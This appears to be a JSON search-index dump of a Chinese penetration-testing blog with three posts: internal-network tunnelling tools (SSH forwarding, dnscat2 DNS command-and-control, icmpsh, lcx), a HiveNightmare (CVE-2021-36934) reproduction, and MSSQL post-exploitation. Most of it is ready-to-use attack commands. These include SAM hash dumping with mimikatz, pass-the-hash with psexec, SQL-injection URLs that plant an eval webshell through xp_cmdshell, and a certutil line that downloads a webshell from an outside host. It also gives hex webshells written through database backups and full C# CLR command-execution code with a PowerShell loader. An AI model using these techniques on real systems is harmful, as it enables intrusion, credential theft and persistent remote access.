root@192.168.1.1\r#VPS检查---查看端口是否已经连接\rnetstat -tulnp | grep \u0026quot;5555\u0026quot;\r 当访问 VPS 5555 端口的时候，就转发给 root@192.168.1.1 边界机 ，发送给目标主机\nSSH 远程转发机制 拓扑：VPS\u0026mdash;-边界WEB\u0026mdash;-目标主机\n边界WEB\u0026mdash;-目标主机\u0026mdash;都是单网卡，都是纯内网 10.1.1.1段\n在WEB边界机运行\nssh -CfNg -R \u0026lt;vps port\u0026gt;:\u0026lt;目标主机 host\u0026gt;:\u0026lt;目标主机 port\u0026gt; \u0026lt;SSH VPS主机\u0026gt;\rssh -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102\r 边界机把内网的端口，远程连接道VPS，远程转发道VPS\nSSH 动态转发机制 这里主要是建立一个动态的socks代理隧道\n在VPS上运行\nssh -CfNg -D 7000 \u0026lt;SSH 边界主机\u0026gt;\rssh -CfNg -D 7000 root@192.168.1.1\r VPS上7000端口上，开了一个socks代理，用代理软件就可以连接\n3.2 DNS 隧道： dnscat2\n工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台\ndnscat2分为两个部分：客户端和服务器。\n服务端为Ruby编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：\n服务端VPS：\n安装依赖：\rapt install gem\rapt install ruby-dev\rapt install libpq-dev\rapt install ruby-bundler\r下载并安装：\rgit clone https://github.com/iagox86/dnscat2.git\rcd dnscat2/server\rsudo gem install bundler\r开启服务：\rruby ./dnscat2.rb vpn.zeo.com -e open\r 目标主机客户端：\n上传dnsClient.zip 到目标主机 解压\n./dnscat --dns server=服务端ip,port=53 --secret=服务端生成的秘钥\r 直连模式使用方法：\nVPS中 server路径下：\rruby ./dnscat2\r客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）\r./dnscat --dns server=x.x.x.x,port=53 --secret=281fc7a7ec57d500d269c96b8ae36ba5\r 四、网络层 4.1 ICMP隧道 ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。\nicmp隧道常用攻击：icmpsh、PRISM\nicmpsh 环境说明:跨平台、不需要管理员运行\n有三台机器： VPS\u0026ndash;边界机\u0026ndash;内网机\nVPS操作过程：\n下载icmpsh\n安装依赖\n服务端禁用：\ricmp respones sysctl -w net.ipv4.icmp_echo_ignore_all=1\r运行程序 ：\r./run.sh\r输入目标主机IP地址 开启监听：\r./icmpsh_m,py vpsip 边界出网的公网IP\r在边界机执行：\rImp.exe -t 攻击机ip -d 500 -b 30 -s 128\r 还有一种方法\n编译 gcc icmpsh-m.c\rVPS开启监听： sudo ./a.out\r内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128\r 4.2 Lcx 内网端口转发\n目标主机：lcx.exe -slave vpsip 4444 127.0.0.1 3389\rVPS:Lcx --listen 4444 5555\r 参考地址 https://xz.aliyun.com/t/7701#toc-0\r ","id":47,"section":"posts","summary":"0x00 内网穿透技术 当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等 主","tags":["流量代理","内网渗透"],"title":"内网穿透工具的使用","uri":"https://ad-calcium.github.io/2021/07/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/","year":"2021"},{"content":"0x01 漏洞介绍 Windows 10 中允许以非管理员用户身份检索所有注册表配置单元。例如，这包括 SAM 中的哈希值，可用于以 SYSTEM 身份执行代码\n0x02 漏洞利用前提 适用于所有受支持的 Windows 10 版本，其中启用了系统保护（在大多数配置中应默认启用）。\n0x03 工具 提权工具：https://github.com/GossiTheDog/HiveNightmare\n横向移动工具：https://github.com/SecureAuthCorp/impacket\nmimikatz：https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210721/mimikatz_trunk.7z\n0x04 漏洞复现 一、检查是否易受攻击 icacls C:\\windows\\system32\\config\\sam\r 如果输出 BUILTIN\\Users:(I)(RX) 表示该系统易受攻击。\n如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。\n二、通过HiveNightmare.exe导出sam hash进行提权 1.查看当前用户 运行exp，运行完成后会在桌面上生成三个文件\n查看转存下的文件\n2.解密凭证 将文件放到本地使用secretsdump.py进行解密，成功获取主机的hash\npython3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL\r 3.解密nthash 使用CMD5网站将nthash进行解密，成功获取明文密码\nhttps://www.cmd5.com/\n4.横向移动 使用获取的hash进行横向移动\npsexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 administrator@10.108.3.77\r psexec乱码解决办法chcp 65001\n三、通过mimkiatz导出sam hash进行提权 1.查看用户属性 普通账号下运行mimikatz并执行查看所有用户的属性\n2.导出shadowcopy volume mimikatz # misc::shadowcopies  3.读取密码 mimikatz# lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskvolumeShadowcopy2\\widows\\system2\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskvolumeShadowcopy2\\windows\\system32\\config\\SAM\r 附录 如果提示以下错误，可能是未开启系统保护（在大多数配置中应默认启用）\n开启系统保护的方法 1.点击配置\n2.点击配置，选择\u0026quot;启用系统保护\u0026quot;\n3.点击\u0026quot;创建\u0026quot;\n4.输入还原点的描述(随便输入即可)\n5.等待创建完成\n提示成功创建\n","id":48,"section":"posts","summary":"0x01 漏洞介绍 Windows 10 中允许以非管理员用户身份检索所有注册表配置单元。例如，这包括 SAM 中的哈希值，可用于以 SYSTEM 身份执行代码 0x02 漏洞利用前提 适用于所有受支持","tags":["漏洞复现","内网"],"title":"CVE-2021-36934 漏洞复现","uri":"https://ad-calcium.github.io/2021/07/cve-2021-36934%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整的解决方案，数据库管理系统SSMS(SQL Server Managerment Studio)，是一个用于建立、使用和维护数据库的集成开发环境。 端口号：1433\nSA用户 在搭建时，选择使用SQL Server身份验证会创建SA账户并设置密码，SA(System Administrator)表示系统管理员，在SQLServer2019之前的SA用户都是系统最高权限用户SYSTEM，但在2019版本时为普通数据库用户mssqlserver，是一个低权用户。\n系统库 系统数据库默认创建时就会存在，有以下4种\n存储过程 存储过程是一个可编程的函数，它在数据库中创建并保存，是存储在服务器中的一组预编译过的T-SQL（SQL语言版本之一，只能在SQLserver使用）语句。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式（可以将存储过程理解为函数调用的过程），使用execute命令执行存储过程。\n系统存储过程、扩展存储过程、用户自定义的存储过程。\n 系统存储过程主要存储在master数据库中，以\u0026quot;sp_\u0026ldquo;为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名； 扩展存储过程则是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以“xp_\u0026ldquo;为前缀，使用方法与系统存储过程类似； 用户定义的存储过程是SQLServer的使用者编写的存储过程；  存储过程为数据库提供了强大的功能，但在相应的权限下，攻击者可以利用不同的存储过程执行不同的高级功能，如：创建数据库用户、枚举文件目录、执行任意系统命令等。正因如此，SQLserver2005、2008等之后的版本分别对存储过程做了权限控制，以防滥用。\nServer权限体系 权限两个字，一个权力，一个限制。在软件领域通俗的解释就是哪些人可以对哪些资源做哪些操作。在SQL Server中，”哪些人”，“哪些资源”,”哪些操作”则分别对应SQL Server中的三个对象，分别为主体(Principals),安全对象(Securables)和权限(Permissions)，而权力和限制则是对应了SQL Server中的GRENT和DENY。对于主体，安全对象和权限的初步理解，见下图：\n主体 “主体”是可以请求 SQL Server 资源的实体。主体可以是个体，组或者进程。主体可以按照作用范围被分为三类:\n Windows级别主体：包括Windows 域登录名和Windows 本地登录名。 服务器级别主体：包括服务器登录名和服务器角色。 数据库级别主体：包括数据库用户、数据库角色、固定数据库角色以及应用程序角色。  可以看到主体包括登录名以及角色。\n角色 角色可以看成是权限的集合体，为了方便权限管理，可以把一些常用权限赋予角色，然后再把角色赋予相关用户，则这些用户就继承了橘色中的所有权限。一般情况下，数据库会内置一些角色，用户也可以创建自定义角色。对角色进行权限管理的方式与对用户进行权限管理的方式是相同的。 角色在SQL Server中被分为三类，分别为:\n 内置角色\u0026mdash;-这类角色在服务器安装时已经默认存在，其权限是固定的，并且不能被删除 用户自定义角色\u0026mdash;-这类角色由用户按照需求自定义创建 应用程序角色\u0026mdash;-这类特殊角色用于管理应用程序的数据访问  角色也分为两个方面：\n 服务器级别的角色，用于数据库服务器方面的控制权限 数据库级别的角色，用于数据库中数据的控制权限。  1.服务器级别的角色 服务器级角色的权限作用域为服务器范围。例如创建、修改、删除数据库，管理磁盘文件，添加或删除数据库连接等等，都是需要服务器上的权限才能进行操作。 固定服务器角色具有一组固定的权限，并且适用于整个服务器范围。 它们专门用于管理 SQL Server，且不能更改分配给它们的权限。 可以在数据库中不存在用户帐户的情况下向固定服务器角色分配登录。 **服务器级别的对象，只能包含登录名。**定义了服务器角色，你定义的登陆用户就有了相应的执行权限。先来看一下服务器级别的固定角色：\n   服务器角色 含义     sysadmin 可以在服务器上执行任何活动   serveradmin 可以更改服务器范围的配置选项和关闭服务器   securityadmin 管理和审核登录用户。具有 GRANT、DENY 和 REVOKE 服务器和数据库级别的权限。此外，还可以重置 SQL Server 登录名的密码   processadmin 管理SQL Server运行的进程   setupadmin 可以使用 T-SQL 语句添加和删除连接服务器，并可以执行某些系统存储过程（如 sp_serveroption）   bulkadmin 可以运行 BULK INSERT 语句   diskadmin 用于管理磁盘文件   dbcreator 可以创建、更改、删除和还原任何数据库   public public角色不同于其它角色在于其权限可以被修改，每个 SQL Server 登录名都属于 public 服务器角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    2.数据库级别的角色 数据库级角色的权限作用域为数据库范围。例如可以访问哪个数据库，可以访问哪个数据库中的哪些数据表、哪些视图、哪些存储过程等等，都需要数据库上的权限才能进行操作。 SQL Server存在两种类型的数据库级角色：数据库中预定义的“固定数据库角色”和可以创建的“用户定义的数据库角色”。 固定数据库角色是SQL Server预定义的数据库角色，具有数据库级别的管理权限，并且存在于每个数据库中。**db_owner *数据库角色的成员可以管理固定数据库角色成员身份。自定义数据库角色是当固定数据库角色不能满足要求时，可以自定义数据库角色。 * 数据库级别的对象，只能包含数据库用户名。**先来看一下数据库级别的固定角色：\n   数据库角色 含义     db_owner 可以执行数据库中技术所有动作的用户，执行所有的配置活动和维护活动   db_securityadmin 管理数据库安全，可以修改角色成员身份和管理权限。向此角色中添加主体可能会导致意外的权限升级   db_accessadmin 可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限   db_backupoperator 可以备份数据库   db_ddladmin 可以在数据库中运行任何数据定义语言 (DDL) 命令   db_datawriter 可以在所有用户表中添加、删除或更改数据   db_datareader 可以从所有用户表中读取所有数据   db_denydatawriter 不能添加、修改或删除数据库内用户表中的任何数据   db_denydatareader 不能读取数据库内用户表中的任何数据   public public角色不同于其它角色在于其权限可以被修改，每个数据库用户、角色或组都属于public数据库角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    登录账号和数据库用户 SQL Server的服务器和数据库是两个层次的概念，SQL Server的用户也分为两种，一种是服务器登陆账号，另一种是数据库用户。 一个人要操作SQL Server数据库，首先要为其创建服务器登陆账号，使得他可以登录到服务器上，然后还要在要操作的数据库上创建和这个登陆账号对应的数据库用户。 可以给登陆账号赋予相应权限，使得这个账号可以执行指定的管理服务器的任务。也可以给数据库用户赋予相应权限，使得这个数据库用户可以在这个数据库中执行指定的操作。 服务器登陆账号分为为Windows验证及SQL Server验证两种。\n Windows身份验证模式：把Windows的操作系统用户添加为SQL Server服务器登陆账号，SQL Server并不参与验证。SQL Server完全相信Windows的验证结果，所以用此方式登录SQL Server时并不需要提供密码。 SQL Server和Windows身份验证模式：这种模式即允许由Windows来验证主体身份，又允许SQL Server来验证主体身份，当由SQL Server验证主体身份时，需要用户名和密码来确认主体身份，和使用什么Windows账户半毛钱关系都没有，是在服务器上创建的另外一种独立账号。  getshell 能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。\n拿shell的两大前提就是\n 有相应的权限db_owner 知道web目录的绝对路径  我们先来了解下怎么去寻找web目录的绝对路径。\n寻找绝对路径  报错信息 字典猜 旁站的目录 存储过程来搜索 读配置文件  前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。\n先来看xp_dirtree直接举例子\nexecute master..xp_dirtree 'c:' --列出所有c:\\文件、目录、子目录 execute master..xp_dirtree 'c:',1 --只列c:\\目录\rexecute master..xp_dirtree 'c:',1,1 --列c:\\目录、文件\r 当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中，这样只需要去读取tmp表中的数据即可\nCREATE TABLE tmp (dir varchar(8000),num int,num1 int);\rinsert into tmp(dir,num,num1) execute master..xp_dirtree 'C:\\Users\\Administrator\\Desktop',1,1;\r 测试完成后记得删除tmp表\ndrop table tmp\r 我们再来看xp_cmdshell怎么去找绝对路径，实际上原理就是调用cmd来查找文件（如果可以执行命令，可以通过远程下载文件的方式下载木马）\nhttp://127.0.0.1/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));\rhttp://127.0.0.1/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i'\r xp_cmdshell拿shell xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径\nhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^\u0026lt;%@ Page Language=\u0026quot;Jscript\u0026quot;%^\u0026gt;^\u0026lt;%eval(Request.Item[\u0026quot;pass\u0026quot;],\u0026quot;unsafe\u0026quot;);%^\u0026gt; \u0026gt; c:\\\\WWW\\\\404.aspx' ;\r 由于cmd写webshell的主意这些转义的问题(所有的尖括号需要转义) 推荐使用certutil下载\n远程下载文件\rcertutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;\r命令：\rhttp://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'certutil -urlcache -split -f \u0026quot;http://172.20.10.4:8000/xxx.aspx\u0026quot; \u0026quot;c:\\wwwroot\\asp\\nice.aspx\u0026quot;' ;\r#加密\rcertutil -encode test.aspx out.txt\r解密\rcertutil -decode c:\\windows\\Temp\\out.txt c:\\wwwroot\\asp\\aspx.aspx\r1.首先在本地使用certutil加密，将加密后的内容复制出来\recho PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLA== \u0026gt; C:\\tmp\\shell.txt\r2.解密\rcertutil -f -decode \u0026quot;C:\\tmp\\shell.txt\u0026quot; \u0026quot;C:\\tmp\\shell.jsp\u0026quot;\r使用certutil下载文件有个弊端就是会产生缓存文件，用如下命令查看：\rcertutil -urlcache *\r执行删除缓存\rcertutil -urlcache * delete\r 差异备份拿shell backup database 库名 to disk = 'c:\\bak.bak';--\rcreate table [dbo].[test] ([cmd] [image]);\rinsert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup database 库名 to disk='C:\\d.asp' WITH DIFFERENTIAL,FORMAT;--\r log备份拿shell LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式\nalter database 库名 set RECOVERY FULL create table cmd (a image) backup log 库名 to disk = 'c:\\xxx' with init insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) （将webshell转成16进制）\rbackup log 库名 to disk = 'c:\\xxx\\2.asp'\r log备份的好处就是备份出来的webshell的文件大小非常的小\n提权 xpcmdshell提权  xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除\n 0x01 xp_cmdshell简介 xp``_cmdshell是Sql Server中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过xp``_cmdshell来进行提权\n影响范围：\n只要该数据库存在该组件，就可以利用\n0x02 xp_cmdshell使用 1. 查看xp_cmdshell状态 判断xpcmdshell权限\ndeclare @RunningOnACluster char(1)\rdeclare @xp_cmdshell_available char(1)\rdeclare @result int set @xp_cmdshell_available='Y' set @result=0\rselect @RunningOnACluster=case when convert(int, serverproperty('IsClustered')) = 1 then 'Y'\relse 'N' end if(0=(select value_in_use from sys.configurations where name='xp_cmdshell'))\rset @xp_cmdshell_available='N' if @RunningOnACluster='Y' begin\rif @xp_cmdshell_available='Y'\rselect @result=1\rif @xp_cmdshell_available='N'\rselect @result=2\rend\rselect @result\r 返回1表示xp_cmdshell组件启用，返回0则表示未启用。\n恢复xp_cmdshell存储过程\n解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。\r第一步先删除：\rdrop procedure sp_addextendedproc\rdrop procedure sp_oacreate\rexec sp_dropextendedproc 'xp_cmdshell'\r第二步恢复：\rdbcc addextendedproc(\u0026quot;sp_oacreate\u0026quot;,\u0026quot;odsole70.dll\u0026quot;)\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot; \u0026quot;)\r直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:\rdbcc addextendedproc(\u0026quot;xp_cmdshell\u0026quot;,\u0026quot;xplog70.dll\u0026quot;)\r代码判断一系列存储过程是否存在，若不存在则恢复。\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]'))\rdbcc addextendedproc ('xp_cmdshell','xplog70.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_dirtree]'))\rdbcc addextendedproc ('xp_dirtree','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_fixeddrives]'))\rdbcc addextendedproc ('xp_fixeddrives','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regwrite]'))\rdbcc addextendedproc ('xp_regwrite','xpstar.dll')\rif not exists (select * from dbo.sysobjects where id = object_id(N'[dbo].[xp_regread]'))\rdbcc addextendedproc ('xp_regread','xpstar.dll')\r 2.开启xp_cmdshell存储过程 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;\r 3.xp_cmdshell执行系统命令 xp_cmdshell执行whoami命令\nexec master.dbo.xp_cmdshell 'whoami'\rexec master.dbo.xp_cmdshell \u0026quot;whoami\u0026quot;\rexec xp_cmdshell \u0026quot;whoami\u0026quot;;\r 4.关闭xp_cmdshell存储过程 关闭xp_cmdshell配置\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;\r 删除xp_cmdshell的语句:\nexec sp_dropextendedproc 'xp_cmdshell';\r 删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。\ndrop procedure xp_cmdshell;\rexec sp_addextendedproc \u0026quot;xp_cmdshell\u0026quot;, \u0026quot;xplog70.dll\u0026quot;;\r 附录\nexec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'\rexec sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'\rexec sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'\rexec sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'\rexec sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'\rexec sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'\r 简单总结：\nxp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。\r启用：\rEXEC sp_configure 'show advanced options', 1\rRECONFIGURE;\rEXEC sp_configure 'xp_cmdshell', 1;\rRECONFIGURE;\r关闭：\rexec sp_configure 'show advanced options', 1;\rreconfigure;\rexec sp_configure 'xp_cmdshell', 0;\rreconfigure;\r删除：\rexec sp_dropextendedproc 'xp_cmdshell';\r执行：\rEXEC master.dbo.xp_cmdshell '命令'\r如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复\rexec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll'\r SP_OACREATE 0x01 sp_oacreate简介  调用wscript.shel执行命令\n sp_oacreate系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合sp_oamethod系统存储过程调用系统wscript.shell来执行系统命令。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言。\n系统管理员使用sp_configure启用sp_oacreate和sp_oamethod系统存储过程对OLE自动化过程的访问（OLE Automation Procedures）\n在效果方面，sp_oacreate、sp_oamethod两个过程和xp_cmdshell过程功能类似，因此可以替换使用！\n利用条件：\n 1.已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）\n2.sqlserver允许远程连接\n3.OLE Automation Procedures选项开启\n 0x02 sp_oacreate使用 1.查看SP_OACREATE状态 我们可以在master.dbo.sysobjects中查看SP_OACREATE状态\nselect * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 2.判断SP_OACREATE是否存在 select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r 利用count(*)判断是否存在，存在即返回1。\n3.启用SP_OACREATE 利用sp_configure存储过程，启用SP_OACREATE\nexec sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; exec sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;\r 4.利用SP_OACREATE执行命令 利用SP_OACREATE执行系统命令\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r 此利用方法无回显\n5.关闭组件命令 exec sp_configure 'show advanced options',1;\rreconfigure;\rexec sp_configure 'Ole Automation Procedures',0;\rreconfigure;\r 简单总结\n判断SP_OACREATE是否存在\rselect count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\r启用：\rEXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; 关闭：\rEXEC sp_configure 'show advanced options', 1;\rRECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE WITH OVERRIDE; 执行：\rdeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all \u0026gt;C:\\\\test\\test.txt'\r以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。\r CLR提权 0x01 CLR简介 CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。\n更多概念详见下方官方链接：\nhttps://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15\n0x02 编写CLR 利用VS创建MSSQL数据库项目\n修改目标平台和勾选创建脚本\n在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：\nCREATE ASSEMBLY SQLCLRTest FROM 'C:\\MyDBApp\\SQLCLRTest.dll' WITH PERMISSION_SET = SAFE;\r 其权限集有三个选项：\nSAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。\nEXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。\nUNSAFE：允许使用任何代码。\n微软关于SQL CLR的详细文档可通过以下地址获得： https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration\n根据不同的数据库选择不同的.net，修改目标框架和权限级别为UNSAFE。\n创建SQL CLR C# 存储过程\n写入代码\nusing System;\rusing System.Data;\rusing System.Data.SqlClient;\rusing System.Data.SqlTypes;\rusing System.Diagnostics;\rusing System.Text;\rusing Microsoft.SqlServer.Server;\rpublic partial class StoredProcedures\r{\r[Microsoft.SqlServer.Server.SqlProcedure]\rpublic static void ExecCommand (string cmd)\r{\r// 在此处放置代码\rSqlContext.Pipe.Send(\u0026quot;Command is running, please wait.\u0026quot;);\rSqlContext.Pipe.Send(RunCommand(\u0026quot;cmd.exe\u0026quot;, \u0026quot; /c \u0026quot; + cmd));\r}\rpublic static string RunCommand(string filename,string arguments)\r{\rvar process = new Process();\rprocess.StartInfo.FileName = filename;\rif (!string.IsNullOrEmpty(arguments))\r{\rprocess.StartInfo.Arguments = arguments;\r}\rprocess.StartInfo.CreateNoWindow = true;\rprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\rprocess.StartInfo.UseShellExecute = false;\rprocess.StartInfo.RedirectStandardError = true;\rprocess.StartInfo.RedirectStandardOutput = true;\rvar stdOutput = new StringBuilder();\rprocess.OutputDataReceived += (sender, args) =\u0026gt; stdOutput.AppendLine(args.Data);\rstring stdError = null;\rtry\r{\rprocess.Start();\rprocess.BeginOutputReadLine();\rstdError = process.StandardError.ReadToEnd();\rprocess.WaitForExit();\r}\rcatch (Exception e)\r{\rSqlContext.Pipe.Send(e.Message);\r}\rif (process.ExitCode == 0)\r{\rSqlContext.Pipe.Send(stdOutput.ToString());\r}\relse\r{\rvar message = new StringBuilder();\rif (!string.IsNullOrEmpty(stdError))\r{\rmessage.AppendLine(stdError);\r}\rif (stdOutput.Length != 0)\r{\rmessage.AppendLine(\u0026quot;Std output:\u0026quot;);\rmessage.AppendLine(stdOutput.ToString());\r}\rSqlContext.Pipe.Send(filename + arguments + \u0026quot; finished with exit code = \u0026quot; + process.ExitCode + \u0026quot;: \u0026quot; + message);\r}\rreturn stdOutput.ToString();\r}\r}\r 编译成功后\n将以下文件保存为dll.ps1(需要修改dll路径)\n$assemblyFile = \u0026quot;C:\\Users\\Administrator\\Desktop\\dll\\sysinfo.dll\u0026quot;\r$stringBuilder = New-Object -Type System.Text.StringBuilder\r$stringBuilder.AppendLine(\u0026quot;use msdb;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;alter database master set trustworthy on;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;\u0026quot;) | Out-Null\r$stringBuilder.Append(\u0026quot;CREATE ASSEMBLY [sysinfo] AUTHORIZATION [dbo] FROM `n0x\u0026quot;) | Out-Null\r$fileStream = [IO.File]::OpenRead($assemblyFile) while (($byte = $fileStream.ReadByte()) -gt -1) { $stringBuilder.Append($byte.ToString(\u0026quot;X2\u0026quot;)) | Out-Null }\r$stringBuilder.AppendLine(\u0026quot;`n WITH PERMISSION_SET = UNSAFE;\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [sysinfo].[StoredProcedures].[ExecCommand]\u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.AppendLine(\u0026quot;exec dbo.ExecCommand 'whoami /all';\u0026quot;) | Out-Null $stringBuilder.AppendLine(\u0026quot; \u0026quot;) | Out-Null\r$stringBuilder.ToString() -join \u0026quot;\u0026quot; | Out-File C:\\Users\\Administrator\\Desktop\\dll\\exec.txt\r 